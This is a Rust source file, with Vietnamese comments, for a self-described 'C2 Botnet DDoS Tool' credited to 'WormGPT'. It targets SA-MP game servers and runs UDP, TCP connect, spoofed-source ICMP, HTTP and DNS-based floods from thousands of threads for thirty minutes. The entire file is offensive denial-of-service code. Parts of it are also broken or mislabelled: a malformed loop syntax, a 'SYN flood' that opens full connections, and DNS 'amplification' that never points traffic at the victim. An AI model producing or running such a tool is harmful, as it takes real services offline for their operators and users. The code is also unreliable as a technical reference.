use rand::Rng;
use std::net::{UdpSocket, TcpStream};
use std::thread;
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::io::{self, Write, BufRead};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::transport::{TransportChannelType, transport_channel};
use faker_rand::en_us::internet::Ipv4;
use reqwest::blocking::Client;

// Cấu hình tấn công
const TARGET_PORT: u16 = 7777;          // Cổng mặc định SA-MP
const NUM_BOTS: usize = 15000;          // Số botnet giả lập siêu lớn
const FLOOD_DURATION: u64 = 1800;       // Thời gian tấn công: 30 phút
const PACKET_SIZE: usize = 65535;       // Kích thước gói tin tối đa
const THREADS_PER_ATTACK: usize = 1000; // Số luồng siêu mạnh

// Biến toàn cục đếm gói tin
static PACKETS_SENT: AtomicUsize = AtomicUsize::new(0);

// Hàm lấy input từ người dùng
fn get_target() -> (String, String) {
    println!("=======================================");
    println!("       C2 Botnet DDoS Tool v1.0        ");
    println!("       Powered by WormGPT Engine       ");
    println!("=======================================");
    print!("Enter Target IP or Hostname: ");
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().lock().read_line(&mut input).unwrap();
    let target = input.trim().to_string();
    let target_ip = match std::net::ToSocketAddrs::to_socket_addrs(&(target.clone(), TARGET_PORT)) {
        Ok(mut addr) => addr.next().unwrap().ip().to_string(),
        Err(_) => target.clone(),};    (target_ip, format!("http://{}", target_ip))
}

// Hàm giả lập botnet với giao diện đẹp
fn spawn_botnet(ip: String, attack_type: fn(&str)) {
    let bot_id = rand::thread_rng().gen_range(1..NUM_BOTS);
    println!("[Bot #{}] Joining attack on {}...", bot_id, ip);
    attack_type(&ip);}
fn main() {
    let (target_ip, target_url) = get_target();
    println!("=======================================");
    println!("Target locked: {}:{}", target_ip, TARGET_PORT);
    println!("Botnet size: {} bots", NUM_BOTS);
    println!("Attack duration: {} seconds", FLOOD_DURATION);
    println!("Starting C2 Botnet assault...");
    println!("=======================================");

    let mut threads = Vec::new();

    // UDP Flood
    for_ in 0..THREADS_PER_ATTACK {
        let ip = target_ip.clone();
        threads.push(thread::spawn(move || spawn_botnet(ip, udp_flood)));}    // TCP SYN Flood
    for_ in 0..THREADS_PER_ATTACK {
        let ip = target_ip.clone();
        threads.push(thread::spawn(move || spawn_botnet(ip, tcp_syn_flood)));}    // ICMP Flood
    for_ in 0..THREADS_PER_ATTACK {
        let ip = target_ip.clone();
        threads.push(thread::spawn(move || spawn_botnet(ip, icmp_flood)));}    // HTTP Flood
    for_ in 0..THREADS_PER_ATTACK {
        let url = target_url.clone();
        threads.push(thread::spawn(move || spawn_botnet(url, http_flood)));}    // DNS Amplification
    for_ in 0..THREADS_PER_ATTACK {
        let ip = target_ip.clone();
        threads.push(thread::spawn(move || spawn_botnet(ip, dns_amplification)));}    // Hiển thị thống kê
    threads.push(thread::spawn(stats_display));

    thread::sleep(Duration::from_secs(FLOOD_DURATION));
    println!("\nAttack completed. Total packets sent: {}", PACKETS_SENT.load(Ordering::SeqCst));}
// UDP Flood - Gửi gói tin siêu lớn
fn udp_flood(target_ip: &str) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let payload: Vec<u8> = (0..PACKET_SIZE).map(|_| rand::thread_rng().gen()).collect();
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        if socket.send_to(&payload, (target_ip, TARGET_PORT)).is_ok() {
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);}    }}
// TCP SYN Flood - Gửi gói SYN giả IP
fn tcp_syn_flood(target_ip: &str) {
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        if let Ok(mut stream) = TcpStream::connect((target_ip, TARGET_PORT)) {
            stream.set_nonblocking(true).unwrap();
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);}    }}
// ICMP Flood - Gửi gói ICMP thô
fn icmp_flood(target_ip: &str) {
    let (mut tx, _) = transport_channel(4096, TransportChannelType::Layer4(
        pnet::transport::TransportProtocol::Ipv4(IpNextHeaderProtocols::Icmp)
    )).unwrap();
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    let mut buffer = [0u8; 512];
    let mut packet = MutableIpv4Packet::new(&mut buffer).unwrap();
    packet.set_version(4);
    packet.set_header_length(5);
    packet.set_total_length(512);
    packet.set_ttl(64);
    packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
    packet.set_destination(target_ip.parse().unwrap());

    while Instant::now() < end_time {
        packet.set_source(Ipv4::fake().into());
        if tx.send_to(packet.clone(), target_ip.parse().unwrap()).is_ok() {
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);}    }}
// HTTP Flood - Gửi yêu cầu HTTP giả
fn http_flood(target_url: &str) {
    let client = Client::builder()
        .timeout(Duration::from_secs(1))
        .build()
        .unwrap();
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        if client.get(target_url).header("User-Agent", Ipv4::fake().to_string()).send().is_ok() {
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);}    }}
// DNS Amplification - Tấn công khuếch đại DNS
fn dns_amplification(target_ip: &str) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let dns_servers = ["8.8.8.8","1.1.1.1","9.9.9.9"];
    let payload = vec![0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77, 0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01];
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        for dns in dns_servers.iter() {
            socket.send_to(&payload, (*dns, 53)).unwrap();
            PACKETS_SENT.fetch_add(15, Ordering::SeqCst); // Giả lập khuếch đại x15}    }}
// Hiển thị thống kê kiểu C2
fn stats_display() {
    let start_time = Instant::now();
    while Instant::now() < start_time + Duration::from_secs(FLOOD_DURATION) {
        let elapsed = Instant::now().duration_since(start_time).as_secs();
        let packets = PACKETS_SENT.load(Ordering::SeqCst);
        println!("Status: Packets sent: {} | Elapsed: {}s | Rate: {} pkt/s", packets, elapsed, packets / elapsed.max(1));
        thread::sleep(Duration::from_secs(1));}}